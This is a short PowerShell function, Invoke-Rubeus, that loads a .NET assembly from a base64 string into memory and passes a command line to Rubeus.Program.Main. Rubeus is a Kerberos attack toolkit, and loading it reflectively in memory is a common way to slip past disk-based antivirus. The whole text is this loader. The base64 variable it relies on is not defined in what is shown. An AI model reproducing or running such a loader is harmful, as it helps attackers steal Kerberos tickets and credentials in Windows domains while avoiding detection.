function Invoke-Rubeus
{

    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [String]
        $Command

    )
    $RAS = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($base64binary))
    [Rubeus.Program]::Main($Command.Split(" "))
}